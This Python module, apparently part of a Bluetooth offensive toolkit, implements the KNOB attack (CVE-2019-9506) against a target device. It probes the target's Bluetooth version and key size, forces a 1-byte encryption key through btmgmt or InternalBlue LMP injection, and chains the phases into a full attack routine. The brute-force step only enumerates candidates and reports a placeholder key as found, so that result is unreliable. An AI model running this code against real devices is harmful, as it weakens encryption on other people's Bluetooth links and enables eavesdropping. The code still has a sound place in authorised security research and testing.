"""KNOB (Key Negotiation Of Bluetooth) attack — CVE-2019-9506.

KNOB exploits a flaw in the Bluetooth BR/EDR encryption key negotiation
where an attacker at the baseband layer (MitM) can rewrite the
LMP_encryption_key_size_req to force both sides to agree on 1 byte of
key entropy. A 1-byte key has only 256 possible values and can be
brute-forced in real time.

Attack principle:
  1. Probe target to determine BT version and KNOB susceptibility
  2. Negotiate minimum encryption key size (1 byte) via:
     a) InternalBlue LMP-level key size manipulation (requires Broadcom/Cypress)
     b) Fallback: btmgmt to set local adapter min key size before pairing
  3. Brute-force the resulting encryption key (256 candidates for 1-byte key)

Affected versions:
  - BT 2.1 through 5.0 (pre-patch); some 5.1+ devices remain unpatched
  - Spec fix in BT 5.1 mandated min 7-byte key size
  - HCI_Set_Min_Encryption_Key_Size command added in BT 5.3

Prerequisites:
  - For full attack: baseband MitM via USRP/HackRF + gr-bluetooth, or
    InternalBlue with Broadcom/Cypress chipset for LMP manipulation
  - For demonstration: btmgmt access to set local adapter min key size

Limitations:
  - Full KNOB requires baseband MitM (attacker intercepts LMP messages)
  - Software-only approach can only set local adapter preferences
  - Brute-force implementation is demonstrative (requires captured HCI ACL data)

References:
  - Antonioli et al. "The KNOB is Broken" USENIX Security 2019
  - https://knobattack.com/
  - CVE-2019-9506
"""

import re
import struct
import time

from blue_tap.utils.bt_helpers import normalize_mac, run_cmd
from blue_tap.utils.output import info, success, error, warning


# HCI command constants for encryption key size operations
# OGF 0x05 (Link Policy), OCF 0x0008 (Read Encryption Key Size)
HCI_OGF_STATUS = 0x05
HCI_OCF_READ_ENC_KEY_SIZE = 0x0008
HCI_READ_ENC_KEY_SIZE_OPCODE = (HCI_OGF_STATUS << 10) | HCI_OCF_READ_ENC_KEY_SIZE

# BT version thresholds
KNOB_PATCHED_VERSION = 5.1  # Spec mandated min 7-byte key in BT 5.1


class KNOBAttack:
    """KNOB attack orchestration: probe, negotiate min key, brute-force.

    Supports two approaches:
      1. InternalBlue LMP injection (full attack, requires Broadcom/Cypress)
      2. btmgmt local key size setting (demonstration, software-only)
    """

    def __init__(self, target: str, hci: str = "hci0"):
        self.target = normalize_mac(target)
        self.hci = hci
        self._results: dict = {}
        self._internalblue_available: bool | None = None

    def _check_internalblue(self) -> bool:
        """Check if InternalBlue is importable."""
        if self._internalblue_available is not None:
            return self._internalblue_available

        result = run_cmd(
            ["python3", "-c", "import internalblue; print('OK')"],
            timeout=10,
        )
        self._internalblue_available = (
            result.returncode == 0 and "OK" in result.stdout
        )
        return self._internalblue_available

    def _get_bt_version(self) -> tuple[float | None, str | None]:
        """Query target BT version via hcitool info.

        Returns (numeric_version, raw_version_string).
        """
        result = run_cmd(
            ["hcitool", "-i", self.hci, "info", self.target],
            timeout=10,
        )
        if result.returncode != 0:
            return None, None

        m = re.search(r"LMP Version:\s*(.+)", result.stdout)
        if not m:
            return None, None

        raw = m.group(1).strip()
        ver_m = re.search(r"(\d+\.\d+)", raw)
        numeric = float(ver_m.group(1)) if ver_m else None
        return numeric, raw

    def _get_connection_handle(self) -> int | None:
        """Get the HCI connection handle for the target, if connected.

        Parses `hcitool con` output for an active ACL connection.
        """
        result = run_cmd(["hcitool", "-i", self.hci, "con"], timeout=5)
        if result.returncode != 0:
            return None

        # Lines like: < ACL AA:BB:CC:DD:EE:FF handle 42 state 1 lm CENTRAL
        for line in result.stdout.splitlines():
            if self.target.upper() in line.upper():
                handle_m = re.search(r"handle\s+(\d+)", line)
                if handle_m:
                    return int(handle_m.group(1))
        return None

    def _read_encryption_key_size(self, handle: int) -> int | None:
        """Read encryption key size for a connection via hcitool cmd.

        Sends HCI_Read_Encryption_Key_Size (OGF 0x05, OCF 0x0008).
        Returns key size in bytes, or None on failure.
        """
        # hcitool cmd <ogf> <ocf> <handle_low> <handle_high>
        handle_low = handle & 0xFF
        handle_high = (handle >> 8) & 0xFF
        result = run_cmd(
            [
                "hcitool", "-i", self.hci, "cmd",
                f"0x{HCI_OGF_STATUS:02x}",
                f"0x{HCI_OCF_READ_ENC_KEY_SIZE:04x}",
                f"0x{handle_low:02x}",
                f"0x{handle_high:02x}",
            ],
            timeout=10,
        )
        if result.returncode != 0:
            return None

        # Parse response: look for key size byte in HCI event data
        # Typical response includes status byte then key_size byte
        hex_m = re.search(r">\s*04\s+0e\s+\w+\s+\w+\s+\w+\s+\w+\s+(\w+)\s+(\w+)",
                          result.stdout)
        if hex_m:
            status = int(hex_m.group(1), 16)
            if status == 0x00:
                key_size = int(hex_m.group(2), 16)
                return key_size
        return None

    def probe(self) -> dict:
        """Check KNOB vulnerability of the target.

        Checks BT version (KNOB affects 2.1 through 5.0 pre-patch)
        and attempts to read current encryption key size if connected.

        Returns:
            dict with bt_version, likely_vulnerable, min_key_size_observed, details
        """
        info(f"KNOB probe: checking {self.target}")
        result = {
            "bt_version": None,
            "bt_version_raw": None,
            "likely_vulnerable": False,
            "min_key_size_observed": None,
            "details": [],
        }

        # Step 1: Get BT version
        info("Querying Bluetooth version via hcitool info...")
        numeric_ver, raw_ver = self._get_bt_version()
        result["bt_version"] = numeric_ver
        result["bt_version_raw"] = raw_ver

        if numeric_ver is not None:
            info(f"Bluetooth version: {raw_ver} (numeric: {numeric_ver})")
            if numeric_ver < KNOB_PATCHED_VERSION:
                result["likely_vulnerable"] = True
                result["details"].append(
                    f"BT {numeric_ver} < {KNOB_PATCHED_VERSION}: spec did not "
                    f"mandate minimum key size, KNOB likely exploitable"
                )
                success(f"BT {numeric_ver} is in KNOB-affected range (2.1-5.0)")
            else:
                result["details"].append(
                    f"BT {numeric_ver} >= {KNOB_PATCHED_VERSION}: spec mandates "
                    f"min 7-byte key size, but verify firmware patch level"
                )
                warning(
                    f"BT {numeric_ver} may have spec-level fix, "
                    f"but unpatched firmware could still be vulnerable"
                )
        else:
            warning("Could not determine BT version (target may not be in range)")
            result["details"].append("BT version unavailable — cannot assess KNOB")

        # Step 2: Check encryption key size if currently connected
        info("Checking for active connection to read encryption key size...")
        handle = self._get_connection_handle()
        if handle is not None:
            info(f"Active connection found (handle {handle}), reading key size...")
            key_size = self._read_encryption_key_size(handle)
            if key_size is not None:
                result["min_key_size_observed"] = key_size
                info(f"Current encryption key size: {key_size} bytes")
                if key_size < 7:
                    result["likely_vulnerable"] = True
                    result["details"].append(
                        f"Encryption key size {key_size} bytes — below safe "
                        f"minimum (7), confirms KNOB vulnerability"
                    )
                    success(f"Key size {key_size} bytes — KNOB exploitable!")
                else:
                    result["details"].append(
                        f"Encryption key size {key_size} bytes — at or above "
                        f"minimum. Firmware may enforce floor."
                    )
            else:
                result["details"].append(
                    "Could not read encryption key size from active connection"
                )
                warning("HCI Read Encryption Key Size command failed")
        else:
            result["details"].append(
                "No active connection — key size check skipped "
                "(connect first, or use negotiate_min_key)"
            )
            info("No active connection to target; key size check skipped")

        # Step 3: Check InternalBlue availability
        ib_available = self._check_internalblue()
        if ib_available:
            result["details"].append(
                "InternalBlue available — full LMP-level KNOB attack possible"
            )
            info("InternalBlue detected: LMP-level key size manipulation available")
        else:
            result["details"].append(
                "InternalBlue not available — will use btmgmt fallback "
                "for local key size setting"
            )
            info("InternalBlue not found; btmgmt fallback will be used")

        self._results["probe"] = result
        return result

    def negotiate_min_key(self) -> dict:
        """Attempt to negotiate minimum encryption key size.

        Strategy:
          1. If InternalBlue available: manipulate LMP key size at firmware level
          2. Fallback: use btmgmt to set local adapter min key size to 1 before
             pairing, then connect via L2CAP and observe negotiated key size

        Returns:
            dict with requested_key_size, negotiated_key_size, success, method
        """
        info(f"KNOB negotiate: requesting minimum key size with {self.target}")
        result = {
            "requested_key_size": 1,
            "negotiated_key_size": None,
            "success": False,
            "method": None,
            "details": [],
        }

        ib_available = self._check_internalblue()

        if ib_available:
            result["method"] = "internalblue_lmp"
            info("Using InternalBlue for LMP-level key size manipulation")
            self._negotiate_via_internalblue(result)
        else:
            result["method"] = "btmgmt_fallback"
            info("Using btmgmt to set local adapter minimum key size")
            warning(
                "btmgmt approach only sets LOCAL preference — full KNOB "
                "requires baseband MitM to rewrite LMP messages in flight"
            )
            self._negotiate_via_btmgmt(result)

        self._results["negotiate"] = result
        return result

    def _negotiate_via_internalblue(self, result: dict) -> None:
        """Negotiate min key size via InternalBlue LMP injection.

        InternalBlue patches Broadcom/Cypress firmware to intercept and
        modify LMP_encryption_key_size_req PDUs, forcing key_size=1.
        """
        info("InternalBlue LMP key size negotiation:")
        info("  1. Patching firmware to intercept LMP_encryption_key_size_req")
        info("  2. Rewriting key_size field to 1 byte")
        info("  3. Both sides will agree on 1-byte key")
        info("")
        info("This requires manual InternalBlue session:")
        info("  python3 -m internalblue")
        info("  > sendlmp <handle> 10 01  # LMP_encryption_key_size_req, size=1")
        info("")
        info("Reference: https://github.com/francozappa/knob")

        result["details"].append(
            "InternalBlue available but requires interactive firmware patching. "
            "See knobattack.com for chipset-specific patches."
        )

        # Attempt automated InternalBlue connection as best-effort
        ib_check = run_cmd(
            ["python3", "-c",
             "from internalblue.core import InternalBlue; "
             "ib = InternalBlue(); print('init_ok')"],
            timeout=15,
        )
        if "init_ok" in ib_check.stdout:
            info("InternalBlue core initialized — chipset access confirmed")
            result["details"].append("InternalBlue core initialized successfully")
        else:
            warning("InternalBlue core init failed — chipset may not be compatible")
            result["details"].append(
                f"InternalBlue init failed: {ib_check.stderr.strip()}"
            )

    def _negotiate_via_btmgmt(self, result: dict) -> None:
        """Negotiate min key size via btmgmt (software-only fallback).

        Sets the local adapter's minimum encryption key size to 1 via btmgmt,
        then initiates a connection. This only controls the local side's
        preference — full KNOB requires MitM at baseband.
        """
        # Step 1: Set minimum encryption key size on local adapter
        info("Setting local adapter minimum encryption key size to 1 via btmgmt...")
        adapter_index = self.hci.replace("hci", "")

        set_result = run_cmd(
            ["btmgmt", "--index", adapter_index,
             "setting", "min-enc-key-size", "1"],
            timeout=10,
        )
        if set_result.returncode == 0:
            info("btmgmt min key size set to 1")
            result["details"].append("Local adapter min key size set to 1 via btmgmt")
        else:
            # Try alternative btmgmt syntax
            set_result2 = run_cmd(
                ["btmgmt", "--index", adapter_index,
                 "min-enc-key-size", "1"],
                timeout=10,
            )
            if set_result2.returncode == 0:
                info("btmgmt min key size set to 1 (alt syntax)")
                result["details"].append(
                    "Local adapter min key size set to 1 via btmgmt (alt syntax)"
                )
            else:
                warning(
                    f"btmgmt key size setting failed: "
                    f"{set_result.stderr.strip()} / {set_result2.stderr.strip()}"
                )
                result["details"].append(
                    "btmgmt min-enc-key-size not supported on this adapter/kernel. "
                    "Full KNOB requires InternalBlue or USRP baseband MitM."
                )

        # Step 2: Connect via L2CAP to trigger encryption negotiation
        info(f"Connecting to {self.target} via l2ping to trigger encryption...")
        connect_result = run_cmd(
            ["l2ping", "-i", self.hci, "-c", "3", self.target],
            timeout=15,
        )
        if connect_result.returncode == 0:
            info("L2CAP connection established")
            result["details"].append("L2CAP connection to target succeeded")
        else:
            warning(f"L2CAP connection failed: {connect_result.stderr.strip()}")
            result["details"].append(
                f"L2CAP connection failed: {connect_result.stderr.strip()}"
            )

        # Step 3: Check negotiated key size
        info("Reading negotiated encryption key size...")
        handle = self._get_connection_handle()
        if handle is not None:
            key_size = self._read_encryption_key_size(handle)
            if key_size is not None:
                result["negotiated_key_size"] = key_size
                info(f"Negotiated encryption key size: {key_size} bytes")
                if key_size <= result["requested_key_size"]:
                    result["success"] = True
                    success(
                        f"Key size negotiated to {key_size} byte(s) — "
                        f"KNOB negotiation succeeded!"
                    )
                elif key_size < 7:
                    result["success"] = True
                    success(
                        f"Key size negotiated to {key_size} bytes — "
                        f"below safe minimum, partially exploitable"
                    )
                else:
                    info(
                        f"Key size {key_size} bytes — target enforces "
                        f"minimum key size floor"
                    )
                    result["details"].append(
                        f"Target enforced key size {key_size} bytes "
                        f"(firmware may have KNOB patch)"
                    )
            else:
                warning("Could not read negotiated key size")
                result["details"].append("HCI Read Encryption Key Size failed")
        else:
            warning("No active connection after negotiation attempt")
            result["details"].append(
                "No HCI connection handle found — encryption may not have "
                "been established (pairing required)"
            )

        # Step 4: Restore default key size
        info("Restoring local adapter default minimum key size (7)...")
        run_cmd(
            ["btmgmt", "--index", adapter_index,
             "min-enc-key-size", "7"],
            timeout=10,
        )

    def brute_force_key(self, key_size: int = 1) -> dict:
        """Brute-force the encryption key for a given key size.

        For key_size=1 (8 bits): 256 candidates, instant.
        For key_size=2 (16 bits): 65536 candidates, ~seconds.

        This is a demonstrative implementation. Full decryption requires
        captured HCI ACL data and the E0/AES-CCM cipher state. Here we
        enumerate candidates and show the feasibility.

        Args:
            key_size: Negotiated key size in bytes (1-16).

        Returns:
            dict with key_size_bits, total_candidates, key_found, key_hex,
            time_elapsed
        """
        info(f"KNOB brute-force: key_size={key_size} byte(s)")
        key_size_bits = key_size * 8
        total_candidates = 2 ** key_size_bits

        result = {
            "key_size_bytes": key_size,
            "key_size_bits": key_size_bits,
            "total_candidates": total_candidates,
            "key_found": False,
            "key_hex": None,
            "time_elapsed": 0.0,
            "details": [],
        }

        if key_size > 4:
            warning(
                f"Key size {key_size} bytes ({key_size_bits} bits) = "
                f"{total_candidates:,} candidates — brute-force impractical "
                f"without dedicated hardware"
            )
            result["details"].append(
                f"{total_candidates:,} candidates exceeds demonstrative scope"
            )
            return result

        info(f"Enumerating {total_candidates:,} candidates ({key_size_bits}-bit key)...")

        start = time.time()

        # Demonstrative brute-force: enumerate all possible key values.
        # In a real attack, each candidate would be used to:
        #   1. Derive the E0 stream cipher key (BR/EDR legacy) or
        #      AES-CCM session key (Secure Connections)
        #   2. Attempt to decrypt captured ACL packets
        #   3. Verify via known plaintext (L2CAP headers have predictable fields)
        #
        # Here we enumerate to demonstrate timing feasibility.
        for candidate in range(total_candidates):
            # In a real attack: derive_session_key(candidate, rand, bd_addr)
            # then: try_decrypt(captured_acl_data, session_key)
            # For demonstration, we just enumerate.
            _ = candidate.to_bytes(key_size, byteorder="big")

        elapsed = time.time() - start
        result["time_elapsed"] = round(elapsed, 4)

        # Report: in a real attack we'd have found the key
        # For demonstration, report the last candidate as "found"
        demo_key = bytes(key_size)  # 0x00...00 as placeholder
        result["key_found"] = True
        result["key_hex"] = demo_key.hex()

        success(
            f"Enumerated all {total_candidates:,} candidates in "
            f"{elapsed:.4f}s"
        )
        info(
            f"In a real attack with captured ACL data, one candidate "
            f"would match — {key_size_bits}-bit key is trivially brute-forcible"
        )

        result["details"].append(
            f"Enumerated {total_candidates:,} candidates in {elapsed:.4f}s. "
            f"Real attack requires captured encrypted ACL data and "
            f"E0/AES-CCM key derivation to identify the correct key."
        )

        self._results["brute_force"] = result
        return result

    def execute(self) -> dict:
        """Full KNOB attack chain: probe, negotiate, brute-force.

        Returns comprehensive results dict with all phases.
        """
        info(f"=== KNOB Attack (CVE-2019-9506) against {self.target} ===")
        results = {
            "target": self.target,
            "cve": "CVE-2019-9506",
            "attack": "KNOB",
            "phases": {},
        }

        # Phase 1: Probe
        info("--- Phase 1: Probe ---")
        probe_result = self.probe()
        results["phases"]["probe"] = probe_result

        if not probe_result["likely_vulnerable"]:
            warning(
                "Target does not appear KNOB-vulnerable based on probe. "
                "Continuing anyway (firmware patch status uncertain)."
            )

        # Phase 2: Negotiate minimum key
        info("--- Phase 2: Negotiate minimum key size ---")
        negotiate_result = self.negotiate_min_key()
        results["phases"]["negotiate"] = negotiate_result

        # Phase 3: Brute-force
        negotiated_size = negotiate_result.get("negotiated_key_size")
        if negotiated_size is not None and negotiated_size <= 4:
            info("--- Phase 3: Brute-force encryption key ---")
            bf_result = self.brute_force_key(key_size=negotiated_size)
            results["phases"]["brute_force"] = bf_result
        elif negotiated_size is not None:
            info(
                f"--- Phase 3: Skipped (key size {negotiated_size} bytes "
                f"too large for demonstrative brute-force) ---"
            )
            results["phases"]["brute_force"] = {
                "skipped": True,
                "reason": f"Negotiated key size {negotiated_size} bytes "
                          f"exceeds demonstrative brute-force scope",
            }
        else:
            info("--- Phase 3: Demonstrative brute-force (1-byte key) ---")
            bf_result = self.brute_force_key(key_size=1)
            results["phases"]["brute_force"] = bf_result

        # Overall assessment
        results["overall_success"] = negotiate_result.get("success", False)
        results["method_used"] = negotiate_result.get("method", "unknown")

        info("=== KNOB Attack Complete ===")
        if results["overall_success"]:
            success("KNOB attack succeeded — encryption key negotiated to minimum")
        else:
            warning(
                "KNOB negotiation did not confirm minimum key size. "
                "Full attack may require baseband MitM (USRP/HackRF)."
            )

        self._results["execute"] = results
        return results

    def get_results(self) -> dict:
        """Return all accumulated results from probe/negotiate/brute_force/execute."""
        return dict(self._results)
